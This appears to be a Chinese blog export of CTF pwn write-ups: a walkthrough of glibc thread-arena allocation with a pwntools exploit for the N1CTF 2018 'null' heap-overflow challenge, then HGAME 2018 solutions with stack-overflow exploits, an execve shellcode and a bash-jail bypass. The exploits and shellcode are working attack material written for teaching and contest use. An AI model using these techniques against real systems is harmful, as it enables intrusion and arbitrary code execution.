null涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 a relatively easy task 。 还是记录一下线程堆块分配的姿势。 线程堆块分配名词解释分配区 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关 1234For 32 bit systems: Number of arena = 2 * number of cores + 1.For 64 bit systems: Number of arena = 8 * number of cores + 1. 锁 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。 数据结构 _heap_info 仅存在于线程堆块里的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。 主要原因是 ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。 该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; malloc_state 对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。 每一个线程有唯一 的malloc_state数据结构，即thread arena。 123456789101112131415161718192021222324252627282930313233struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 结构组织 分配区的获取 可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数 12345678910111213141516171819202122232425262728293031void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。 跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构 1234#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0) 继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。 123456#define arena_lock(ptr, size) do &#123; \ if (ptr &amp;&amp; !arena_is_corrupt (ptr)) \ (void) mutex_lock (&amp;ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) 由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2： 首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。 narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748arena_get2 (size_t size, mstate avoid_arena)&#123; mstate a; static size_t narenas_limit; a = get_free_list (); if (a == NULL) &#123; /* Nothing immediately available, so generate a new arena. */ if (narenas_limit == 0) &#123; if (mp_.arena_max != 0) narenas_limit = mp_.arena_max; else if (narenas &gt; mp_.arena_test) &#123; int n = __get_nprocs (); if (n &gt;= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2); &#125; &#125; repeat:; size_t n = narenas; /* NB: the following depends on the fact that (size_t)0 - 1 is a very large number and that the underflow is OK. If arena_max is set the value of arena_test is irrelevant. If arena_test is set but narenas is not yet larger or equal to arena_test narenas_limit is 0. There is no possibility for narenas to be too big for the test to always fail since there is not enough address space to create that many arenas. */ if (__glibc_unlikely (n &lt;= narenas_limit - 1)) &#123; if (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&amp;narenas); &#125; else a = reused_arena (avoid_arena); &#125; return a;&#125; 先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。 123456789101112131415161718192021222324252627282930static mstateget_free_list (void)&#123; mstate replaced_arena = thread_arena; mstate result = free_list; if (result != NULL) &#123; (void) mutex_lock (&amp;free_list_lock); result = free_list; if (result != NULL) &#123; free_list = result-&gt;next_free; /* The arena will be attached to this thread. */ ++result-&gt;attached_threads; detach_arena (replaced_arena); &#125; (void) mutex_unlock (&amp;free_list_lock); if (result != NULL) &#123; LIBC_PROBE (memory_arena_reuse_free_list, 1, result); (void) mutex_lock (&amp;result-&gt;mutex); thread_arena = result; &#125; &#125; return result;&#125; 再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263static mstatereused_arena (mstate avoid_arena)&#123; mstate result; /* FIXME: Access to next_to_use suffers from data races. */ static mstate next_to_use; if (next_to_use == NULL) next_to_use = &amp;main_arena; /* Iterate over all arenas (including those linked from free_list). */ result = next_to_use; do &#123; if (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex)) goto out; /* FIXME: This is a data race, see _int_new_arena. */ result = result-&gt;next; &#125; while (result != next_to_use); /* Avoid AVOID_ARENA as we have already failed to allocate memory in that arena and it is currently locked. */ if (result == avoid_arena) result = result-&gt;next; /* Make sure that the arena we get is not corrupted. */ mstate begin = result; while (arena_is_corrupt (result) || result == avoid_arena) &#123; result = result-&gt;next; if (result == begin) break; &#125; /* We could not find any arena that was either not corrupted or not the one we wanted to avoid. */ if (result == begin || result == avoid_arena) return NULL; /* No arena available without contention. Wait for the next in line. */ LIBC_PROBE (memory_arena_reuse_wait, 3, &amp;result-&gt;mutex, result, avoid_arena); (void) mutex_lock (&amp;result-&gt;mutex);out: /* Attach the arena to the current thread. Note that we may have selected an arena which was on free_list. */ &#123; /* Update the arena thread attachment counters. */ mstate replaced_arena = thread_arena; (void) mutex_lock (&amp;free_list_lock); detach_arena (replaced_arena); ++result-&gt;attached_threads; (void) mutex_unlock (&amp;free_list_lock); &#125; LIBC_PROBE (memory_arena_reuse, 2, result, avoid_arena); thread_arena = result; next_to_use = result-&gt;next; return result;&#125; 最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。 至此，一个新的分配区生成完毕。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768static mstate_int_new_arena (size_t size)&#123; mstate a; heap_info *h; char *ptr; unsigned long misalign; h = new_heap (size + (sizeof (*h) + sizeof (*a) + MALLOC_ALIGNMENT), mp_.top_pad); if (!h) &#123; /* Maybe size is too large to fit in a single heap. So, just try to create a minimally-sized arena and let _int_malloc() attempt to deal with the large request via mmap_chunk(). */ h = new_heap (sizeof (*h) + sizeof (*a) + MALLOC_ALIGNMENT, mp_.top_pad); if (!h) return 0; &#125; a = h-&gt;ar_ptr = (mstate) (h + 1); malloc_init_state (a); a-&gt;attached_threads = 1; /*a-&gt;next = NULL;*/ a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size; arena_mem += h-&gt;size; /* Set up the top chunk, with proper alignment. */ ptr = (char *) (a + 1); misalign = (unsigned long) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK; if (misalign &gt; 0) ptr += MALLOC_ALIGNMENT - misalign; top (a) = (mchunkptr) ptr; set_head (top (a), (((char *) h + h-&gt;size) - ptr) | PREV_INUSE); LIBC_PROBE (memory_arena_new, 2, a, size); mstate replaced_arena = thread_arena; thread_arena = a; mutex_init (&amp;a-&gt;mutex); (void) mutex_lock (&amp;list_lock); /* Add the new arena to the global list. */ a-&gt;next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier (); main_arena.next = a; (void) mutex_unlock (&amp;list_lock); (void) mutex_lock (&amp;free_list_lock); detach_arena (replaced_arena); (void) mutex_unlock (&amp;free_list_lock); /* Lock this arena. NB: Another thread may have been attached to this arena because the arena is now accessible from the main_arena.next list and could have been picked by reused_arena. This can only happen for the last arena created (before the arena limit is reached). At this point, some arena has to be attached to two threads. We could acquire the arena lock before list_lock to make it less likely that reused_arena picks this new arena, but this could result in a deadlock with ptmalloc_lock_all. */ (void) mutex_lock (&amp;a-&gt;mutex); return a;&#125; 最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475static heap_info *internal_functionnew_heap (size_t size, size_t top_pad)&#123; size_t pagesize = GLRO (dl_pagesize); char *p1, *p2; unsigned long ul; heap_info *h; if (size + top_pad &lt; HEAP_MIN_SIZE) size = HEAP_MIN_SIZE; else if (size + top_pad &lt;= HEAP_MAX_SIZE) size += top_pad; else if (size &gt; HEAP_MAX_SIZE) return 0; else size = HEAP_MAX_SIZE; size = ALIGN_UP (size, pagesize); /* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed. No swap space needs to be reserved for the following large mapping (on Linux, this is the case for all non-writable mappings anyway). */ p2 = MAP_FAILED; if (aligned_heap_area) &#123; p2 = (char *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); aligned_heap_area = NULL; if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123; __munmap (p2, HEAP_MAX_SIZE); p2 = MAP_FAILED; &#125; &#125; if (p2 == MAP_FAILED) &#123; p1 = (char *) MMAP (0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE); if (p1 != MAP_FAILED) &#123; p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1)) &amp; ~(HEAP_MAX_SIZE - 1)); ul = p2 - p1; if (ul) __munmap (p1, ul); else aligned_heap_area = p2 + HEAP_MAX_SIZE; __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul); &#125; else &#123; /* Try to take the chance that an allocation of only HEAP_MAX_SIZE is already aligned. */ p2 = (char *) MMAP (0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); if (p2 == MAP_FAILED) return 0; if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123; __munmap (p2, HEAP_MAX_SIZE); return 0; &#125; &#125; &#125; if (__mprotect (p2, size, PROT_READ | PROT_WRITE) != 0) &#123; __munmap (p2, HEAP_MAX_SIZE); return 0; &#125; h = (heap_info *) p2; h-&gt;size = size; h-&gt;mprotect_size = size; LIBC_PROBE (memory_heap_new, 2, h, h-&gt;size); return h;&#125; 分配区的补充 在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。 123456789101112131415161718192021222324252627282930313233343536373839 ... if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (have_fastchunks (av)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; /* Otherwise, relay to handle system-dependent cases */ else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125;... 追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。 123456789101112131415161718192021static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av)&#123; mchunkptr old_top; /* incoming value of av-&gt;top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO (dl_pagesize); bool tried_mmap = false; /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) { ... } if (av != &amp;main_arena) { heap_info *old_heap, *heap; size_t old_heap_size; /* First try to extend the current heap. */ old_heap = heap_for_ptr (old_top); old_heap_size = old_heap-&gt;size; if ((long) (MINSIZE + nb - old_size) &gt; 0 &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == 0) { av-&gt;system_mem += old_heap-&gt;size - old_heap_size; arena_mem += old_heap-&gt;size - old_heap_size; set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top) | PREV_INUSE); } else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad))) { /* Use a newly allocated heap. */ heap-&gt;ar_ptr = av; heap-&gt;prev = old_heap; av-&gt;system_mem += heap-&gt;size; arena_mem += heap-&gt;size; /* Set up the new top. */ top (av) = chunk_at_offset (heap, sizeof (*heap)); set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK; set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE); if (old_size &gt;= MINSIZE) { set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ)); set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free (av, old_top, 1); } else { set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE); set_foot (old_top, (old_size + 2 * SIZE_SZ)); } } else if (!tried_mmap) /* We can at least try to use to mmap memory. */ goto try_mmap; } else /* av == main_arena */ { ... } } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139 至此，线程堆的初始化、扩展、sub_heap生成全部完成。 ​ ## 题目分析 题目逻辑很简单，主函数什么都没有，只开启了一个线程。 ![](/img/n1ctf2018/2-1.png) 在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。 ![](/img/n1ctf2018/2-3.png) ![](/img/n1ctf2018/2-2.png) ## 漏洞利用 漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。 ![](/img/n1ctf2018/2-4.png) 该程序不存在地址泄露，并且system的地址也已经给出。 利用方法是利用上述线程堆块分配的知识。 1. 首先将线程第一次分配的非主分配区填充满 2. 再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。 3. 再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。 4. 选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为&apos;/bin/sh&apos;即可获得shell。 **hint：** 1. 一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。 ，与第一题的利用相同，都是0x7f。 2. 无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。 ​ ## 解题脚本 ```pythonfrom pwn import *import timedebug = 1elf = ELF(&apos;./null&apos;)if debug: p = process(&apos;./null&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) context.log_level = &apos;debug&apos;else: exit(0)p.recvuntil(&apos;Enter secret password:&apos;)p.send(&apos;i\&apos;m ready for challenge\n&apos;)time.sleep(3) for i in range(0,3): p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(90-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;)p.recvuntil(&apos;Action:&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Size:&apos;)p.sendline(str(0x4000))p.recvuntil(&apos;blocks:&apos;)p.sendline(str(1))p.recvuntil(&apos;(0/1):&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Input:&apos;) p.send(&apos;/bin/sh\0&apos;+p64(0)*(2+4+2+8+3-1))padding = p64(0)*(0x4000/8-2-4-8-3) +p64(0)+ p64(0x11) + p64(0)*4 +p64(0) + p64(0)*5+p64(0x60201d)+ p64(0)*4 #p64(0x602028-4)print hex(len(padding))p.send(padding)#gdb.attach(p,&apos;info threads&apos;)p.recvuntil(&apos;Action:&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Size:&apos;)p.sendline(str(0x60))p.recvuntil(&apos;blocks:&apos;)p.sendline(str(0))p.recvuntil(&apos;(0/1):&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Input:&apos;)p.send(&apos;sh\0&apos;+p64(0)+p64(0x400978)+p64(0)*(0x60/8)) p.interactive() ​ # 其他 1. 打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。 2. 想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验 123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;pthread.h&gt;static int num;void *thread_func()&#123; char *a ; a = malloc(0x80); printf("[%d] malloc address %p\n",num++,a); sleep(10);&#125;int main()&#123; pthread_t tid[40]; int i; void * ret; char *a; num = 0; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); printf("this is a test for thread arena! %d\n",num); for(i = 0; i&lt;33;i++)&#123; pthread_create(&amp;tid[i],NULL,thread_func,NULL); &#125; a = malloc(0x80); printf("[*] main malloc address %p\n",a); for(i = 0; i&lt;33;i++)&#123; //pthread_create(&amp;tid[i],NULL,thread_func,NULL); pthread_join(tid[i],0); &#125; sleep(10);&#125;]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME 2018 PWN题记录]]></title>
    <url>%2F2018%2F03%2F06%2Fhgame%2F</url>
    <content type="text"><![CDATA[HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。 LEVEL - WEEK 1guess_number题目流程很简单，首先使用/dev/urandom文件生成随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。 这题存在一个明显的栈溢出漏洞，但是开启了canary保护。起初思路被urandom函数带偏了，以为是要用伪随机本地爆破rand()种子，再进行生成，还暗搓搓的感叹好难啊。。后来发现在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。 解题的exp脚本如下 1234567891011121314151617181920#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./guess_number') context.log_level = 'debug'else: p = remote('111.230.149.72 ', 10002)p.recvuntil('enter your guess:')a = "0\x00"a = a.ljust(0x128,'\x00')print len(a)p.sendline(a)print p.recv()p.interactive() flag_server题目的内容是一个登陆系统，当用户输入”admin”和随机数密码时可以将一个v9变量赋值为1，进一步可以执行system(‘cat flag’) 其中，存在一个明显的整数负数溢出漏洞，当输入的长度是负数的时候，可以输入任意长的内容，在read_n函数中溢出，则可以覆盖到调用read_n函数的main函数栈中，进一步可以覆盖v9变量为任意值，导致控制逻辑流程。 解题的exp脚本如下： 1234567891011121314151617181920from pwn import *import timedebug=0if debug: p= process('./flag_server') context.log_level = 'debug'else: p = remote('111.230.149.72 ', 10001)p.recvuntil('your username length: ')p.sendline('-1')p.recvuntil('whats your username?')a = "admin"a = a.ljust(0x50,'1')print len(a)p.sendline(a)print p.recv()p.interactive() zazahui一道贪玩蓝月梗的题目，在初始化函数中，分别将广告词和flag读到bss段中，在sub_8048698()函数中，一直让用户输入广告词。 漏洞被故意留在sub_8048698函数中，根据栈中变量位置和输入长度可以很明显的发现可以覆盖s这个变量，当把变量覆盖为flag地址时，在puts(s)中就可以读出flag。 使用的exp脚本如下： 1234567891011121314151617#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./zazahui') context.log_level = 'debug' gdb.attach(p,'b *0x80486D5')else: p = remote('111.230.149.72 ', 10003)p.recvuntil('&gt;')a= 'a'*0xb0+p32(0x804A060)+p32(0x99)p.sendline(a)p.recv()p.interactive() LEVEL - WEEK 2ez_shellcode代码逻辑从题目名字中就可猜测出来，用户输入一串shellcode，程序来执行，仅仅限制了shellcode长度不超过24个字节。 这样一来，pwntools的shellcraft.sh()就不能用了，只能手写一个shellcode拿到shell。其原理是执行int 80h，使得ebp指向’/bin/sh’,eax的值是0xb,ecx、edx置零就可以了。 解题使用的exp脚本如下： 12345678910111213141516171819202122232425262728293031#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./ez_shellcode') context.log_level = 'debug' gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10004)p.recvuntil('&gt;')shellcode = '''push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxpush 0xbpop eaxint 0x80'''a = shellcraft.sh()print len(asm(shellcode))p.sendline(asm(shellcode))p.interactive() ez_bash_jail此题给用户一个system(lineptr)的权利，但是限制了用户输入’abcfhgilnst‘这些字母。这样一来如’cat flag’、’cat fl\‘、’sh’、’/bin/sh’就都不能用了。 题目给了hint，是研究一下system源码：https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system 123456789101112131415161718192021222324252627282930313233343536373839... ...116 #ifdef FORK117 pid = FORK ();118 #else119 pid = __fork ();120 #endif121 if (pid == (pid_t) 0)122 &#123;123 /* Child side. */124 const char *new_argv[4];125 new_argv[0] = SHELL_NAME;126 new_argv[1] = "-c";127 new_argv[2] = line;128 new_argv[3] = NULL;129 130 /* Restore the signals. */131 (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL);132 (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL);133 (void) __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL);134 INIT_LOCK ();135 136 /* Exec the shell. */137 (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);138 _exit (127);139 &#125;140 else if (pid &lt; (pid_t) 0)141 /* The fork failed. */142 status = -1;143 else144 /* Parent side. */145 &#123;146 /* Note the system() is a cancellation point. But since we call147 waitpid() which itself is a cancellation point we do not148 have to do anything here. */149 if (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, 0)) != pid)150 status = -1;151 &#125;... 可以看到system的最后是执行了execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=lineptr 的。 再看一下execve的用法是什么： 1execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。 就是可以重新执行一份新的代码。 再看下一个hint，学习一下shell的变量,正则等等? 题目中过滤了许多正常字符，但是\$符号没有被过滤，$是bash脚本中一个特殊的符号，可以定义变量，在搜索中发现bash中有几个特殊的变量 1234567$0就是该bash文件名$?是上一指令的返回值$*所有位置参数的内容：就是调用调用本bash shell的参数。$@基本上与上面相同。只不过是“$*”返回的是一个字符串，字符串中存在多外空格。“$@”返回多个字符串。&quot;$1&quot;，它代表一条记录中的第一列数据 其中最特殊的是$0，它是执行execve程序时的filename路径。可以通过如下代码测试出来 123456789101112131415161718192021222324a#! /bin/shecho &quot;=============&quot;echo $0echo &quot;=============&quot;main.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[])&#123; char *newargv[] = &#123; &quot;xx&quot; &#125;; char *newenviron[] = &#123; NULL &#125;; newargv[0] = argv[1]; execve(&quot;./a&quot;, newargv, newenviron); perror(&quot;execve&quot;); /* execve() only returns on error */ exit(EXIT_FAILURE);&#125; 